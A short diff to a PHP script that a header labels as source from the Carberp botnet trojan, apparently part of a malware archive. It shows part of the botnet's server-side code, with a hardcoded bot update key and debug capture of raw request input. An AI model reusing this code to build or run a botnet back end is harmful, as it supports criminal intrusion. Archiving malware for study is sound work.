@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       —
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     —
+ */
 <?php
 
 $dir = str_replace('/scripts/set', '', str_replace('\\', '/', realpath('.'))) . '/';
@@ -16,7 +27,8 @@ if(@$_POST['id'] == 'BOTNETCHECKUPDATER0-WD8Sju5VR1HU8jlV'){
 $dbug = false;
 $dbug = true;
 
-if($dbug == true){	$input = array();
+if($dbug == true){
+	$input = array();
 	$input[] = 'FullInput: ' . file_get_contents('php://input');
 	$input[] = 'FullGet: ' . print_r($_GET, true);
 }
